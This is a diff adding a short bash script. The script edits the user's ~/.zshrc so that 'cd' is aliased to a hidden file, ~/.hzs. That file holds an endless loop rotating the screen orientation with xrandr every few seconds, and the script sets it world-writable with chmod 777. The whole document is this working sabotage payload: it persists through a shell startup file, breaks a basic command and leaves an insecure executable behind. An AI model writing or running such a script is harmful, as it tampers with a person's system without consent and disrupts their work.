@@ -1,0 +1,4 @@
+#!/bin/bash
+echo "alias cd=~/.hzs" >> ~/.zshrc
+echo -e "while true; do\nxrandr -o 1\nsleep 5\nxrandr -o 2\nsleep 5\nxrandr -o 3\nsleep 5\nxrandr -o 2\nsleep 5\nxrandr -o 0\nsleep 5\nxrandr -o 2\ndone" > ~/.hzs
+chmod 777 ~/.hzs
